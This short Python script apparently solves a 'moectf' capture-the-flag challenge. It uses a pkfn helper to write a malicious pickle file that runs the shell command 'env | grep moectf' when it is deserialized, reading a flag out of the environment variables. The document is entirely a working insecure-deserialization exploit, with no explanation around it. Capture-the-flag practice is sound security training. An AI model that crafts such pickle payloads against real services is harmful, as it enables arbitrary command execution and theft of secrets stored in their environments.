from pkfn import dumps_cmd
from pathlib import Path
with open(Path("c:\\Users\\Administrator\\Desktop\\1.pkl"), "wb") as f:
    f.write(dumps_cmd("env | grep moectf"))